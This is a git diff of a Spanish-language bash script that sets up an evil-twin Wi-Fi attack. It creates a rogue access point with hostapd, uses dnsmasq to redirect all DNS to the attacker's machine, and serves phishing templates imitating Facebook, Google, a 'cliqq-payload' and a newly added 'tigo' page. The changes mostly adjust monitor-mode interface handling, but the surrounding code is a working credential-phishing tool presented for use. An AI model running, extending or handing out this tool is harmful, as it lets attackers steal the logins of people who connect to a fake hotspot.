@@ -9,10 +9,10 @@ function ctrl_c(){
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
 	rm -r iface 2>/dev/null
 	find \-name datos-privados.txt | xargs rm 2>/dev/null
-	sleep 1.5; ifconfig wlan0mon down 2>/dev/null; sleep 1
-	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
-	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
-	tput cnorm; service network-manager restart
+	sleep 1.5; ifconfig $choosed_interface'mon' down 2>/dev/null; sleep 1
+	iwconfig $choosed_interface'mon' mode monitor 2>/dev/null; sleep 1
+	ifconfig $choosed_interface'mon' up 2>/dev/null; airmon-ng stop $choosed_interface'mon' > /dev/null 2>&1; sleep 1
+	tput cnorm;
 	exit 0
 }
 
@@ -62,13 +62,13 @@ function startAttack(){
 	echo -e "\n[*] Listando interfaces de red disponibles..."; sleep 1
 
 	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
-	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
+	interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
 	counter=1; for interface in $(cat iface); do
 		echo -e "\t\n$counter. $interface"; sleep 0.26
 		let counter++
 	done; tput cnorm
 	checker=0; while [ $checker -ne 1 ]; do
-		echo -ne "\n[*] Nombre de la interfaz (Ej: wlan0mon): " && read choosed_interface
+		echo -ne "\n[*] Nombre de la interfaz (Ej: wlan0): " && read choosed_interface
 
 		for interface in $(cat iface); do
 			if [ "$choosed_interface" == "$interface" ]; then
@@ -76,7 +76,7 @@ function startAttack(){
 			fi
 		done; if [ $checker -eq 0 ]; then echo -e "\n[!] La interfaz proporcionada no existe"; fi
 	done
-
+	airmon-ng start $choosed_interface > /dev/null 2>&1;
 	rm iface 2>/dev/null
 	echo -ne "\n[*] Nombre del punto de acceso a utilizar (Ej: wifiGratis): " && read -r use_ssid
 	echo -ne "[*] Canal a utilizar (1-12): " && read use_channel; tput civis
@@ -84,7 +84,7 @@ function startAttack(){
 	# killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
 	sleep 2
 
-	echo -e "interface=$choosed_interface\n" > hostapd.conf
+	echo -e "interface=$choosed_interface"mon"\n" > hostapd.conf
 	echo -e "driver=nl80211\n" >> hostapd.conf
 	echo -e "ssid=$use_ssid\n" >> hostapd.conf
 	echo -e "hw_mode=g\n" >> hostapd.conf
@@ -93,24 +93,24 @@ function startAttack(){
 	echo -e "auth_algs=1\n" >> hostapd.conf
 	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
 
-	echo -e "[*] Configurando interfaz $choosed_interface\n"
+	echo -e "[*] Configurando interfaz $choosed_interface'mon'\n"
 	sleep 2
 	echo -e "[*] Iniciando hostapd..."
 	hostapd hostapd.conf > /dev/null 2>&1 &
 	sleep 5
 
 	echo -e "\n[*] Configurando dnsmasq..."
-	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
+	echo -e "interface=$choosed_interface"mon"\n" > dnsmasq.conf
 	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
 	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
 	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
-	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
+	echo -e "server=8.8.8.8\n" >> dnsmasq.conf	
 	echo -e "log-queries\n" >> dnsmasq.conf
 	echo -e "log-dhcp\n" >> dnsmasq.conf
 	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
 	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
 
-	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
+	ifconfig $choosed_interface'mon' up 192.168.1.1 netmask 255.255.255.0
 	sleep 1
 	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
 	sleep 1
@@ -118,10 +118,10 @@ function startAttack(){
 	sleep 3
 
 	# Array de plantillas
-	plantillas=(facebook-login google-login cliqq-payload )
+	plantillas=(facebook-login google-login cliqq-payload tigo )
 
 	tput cnorm; echo -ne "\n [Información] Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)\n\n"
-	echo -ne "[*] Plantilla a utilizar (facebook-login , google-login , cliqq-payload): " && read template
+	echo -ne "[*] Plantilla a utilizar (facebook-login , google-login , cliqq-payload , tigo): " && read template
 
 	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
 		if [ "$plantilla" == "$template" ]; then
